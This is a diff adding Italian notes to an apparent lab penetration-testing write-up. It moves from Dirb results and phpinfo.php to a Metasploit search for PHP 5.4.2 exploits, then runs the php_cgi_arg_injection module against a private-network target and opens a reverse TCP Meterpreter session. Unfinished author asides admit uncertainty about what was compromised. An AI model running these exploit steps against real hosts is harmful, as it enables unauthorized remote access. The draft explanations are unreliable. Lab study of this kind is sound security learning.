@@ -46,3 +46,48 @@ DOWNLOADED: 20458 - FOUND: 2
 La cosa più bella di Dirb è che i risultati ottenuti possono essere aperti direttamente fornendo una vista del risultato
 
 <img src="/imgs/HTTP_Dirb.png" width="500"> </br>
+
+Così facendo abbiamo la possibilità di usare il file per effettuare l'enumerazione di tutti i servizi attivi e le risorse della macchina. Ma torniamo all'utilizzo di metasploit, il file __phpinfo.php__ ci dà anche informazioni sulla versione di php attiva sul server. Vediamo cosa trova metasploid:
+```
+root@kali:~# msfconsole
+
+msf6 > search php 5.4.2
+
+Matching Modules
+================
+
+   #  Name                                                 Disclosure Date  Rank       Check  Description
+   -  ----                                                 ---------------  ----       -----  -----------
+   0  exploit/multi/http/op5_license                       2012-01-05       excellent  Yes    OP5 license.php Remote Command Execution
+   1  exploit/multi/http/php_cgi_arg_injection             2012-05-03       excellent  Yes    PHP CGI Argument Injection
+   2  exploit/windows/http/php_apache_request_headers_bof  2012-05-08       normal     No     PHP apache_request_headers Function Buffer Overflow
+
+
+Interact with a module by name or index. For example info 2, use 2 or use exploit/windows/http/php_apache_request_headers_bof
+```
+
+Abbiamo non uno ma ben tre exploit disponibili, di cui due con una classificazione __Excellent__ concentramoci su questi. Il primo __exploit/multi/http/op5_license__ ci permette di eseguire comandi da remoto come root sulla macchina targhet, il nostro compito è quindi mandare un payload da far eseguire per garantirci una shell sulla macchina.
+
+--__DEVO CAPIRE UN ATTIMO STA PARTE PERCHé NON L'HO SCRITTA BENE ma a quanto pare di default usa il payload php/meterpreter/reverse_tcp nello specifico un reverse_tcp permette di aprire una connessione ma dal target a me, in questo modo un firewall non blocca niente__
+
+Mentre la seconda opzione __exploit/multi/http/php_cgi_arg_injection__ ci informa sulla vulnerabiltià di argument injection. Nello specifico questo modulo sfrutta il flag __-d__ per impostare l'esecuzione di codice nella pagina php.ini.
+
+__--Sono arrivato qui ed ho pure fatto l'exploit, solo che non sono sicuro di aver avuto accesso all'altra macchina ma penso più alla mia .-. LOL cmq devo capire un attimos /129 è la target 128 sono io__
+```
+msf6 exploit(multi/http/php_cgi_arg_injection) > set lhost 192.168.139.128
+lhost => 192.168.139.128
+msf6 exploit(multi/http/php_cgi_arg_injection) > set rhost 192.168.139.129
+rhost => 192.168.139.129
+msf6 exploit(multi/http/php_cgi_arg_injection) > exploit
+
+[*] Started reverse TCP handler on 192.168.139.128:4444 
+[*] Sending stage (39282 bytes) to 192.168.139.129
+[*] Meterpreter session 1 opened (192.168.139.128:4444 -> 192.168.139.129:41864) at 2021-12-13 00:45:40 -0500
+
+meterpreter > sessions
+Usage: sessions <id>
+
+Interact with a different session Id.
+This works the same as calling this from the MSF shell: sessions -i <session id>
+```
+
